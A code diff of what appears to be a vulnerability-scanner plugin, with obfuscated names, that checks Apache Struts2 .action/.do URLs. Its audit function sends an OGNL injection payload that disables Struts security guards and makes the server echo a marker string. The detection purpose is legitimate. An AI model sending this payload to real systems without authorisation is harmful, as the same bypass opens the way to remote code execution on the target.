@@ -8,13 +8,14 @@ def assign(service, arg):
         OO0o = urlparse.urlparse(arg)
         if OO0o.path.endswith(".action") or OO0o.path.endswith(".do"):
             return True, "%s://%s%s" % (OO0o.scheme, OO0o.netloc, OO0o.path)
-        return True, '%s://%s/website-rank/getVoteRecordByManuscriptId.action' % (OO0o.scheme, OO0o.netloc)
+        return True, '%s://%s' % (OO0o.scheme, OO0o.netloc)
     elif service == "struts":
         return True, arg
 
 
 def audit(arg):
     task_push('struts',arg)
+    # return True, '%s://%s/website-rank/getVoteRecordByManuscriptId.action' % (OO0o.scheme, OO0o.netloc)
     ii11i = "('#_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('#context[\'xwork.MethodAccessor.denyMethodExecution\']=false')(b))&('#c')(('#_memberAccess.excludeProperties=@java.util.Collections@EMPTY_SET')(c))&(g)(('#req=@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('#xman=@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('#xman=@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('#xman.getWriter().println(%22@websafescan@%22)')(d))&(i99)(('#xman.getWriter().close()')(d))=1"
     oOooOoO0Oo0O = '''@websafescan@'''
     iI1, i1I11i, OoOoOO00, I11i, O0O = curl.curl2('''%s?stamp=%s&%s''' % (arg, str(time.time()), ii11i))
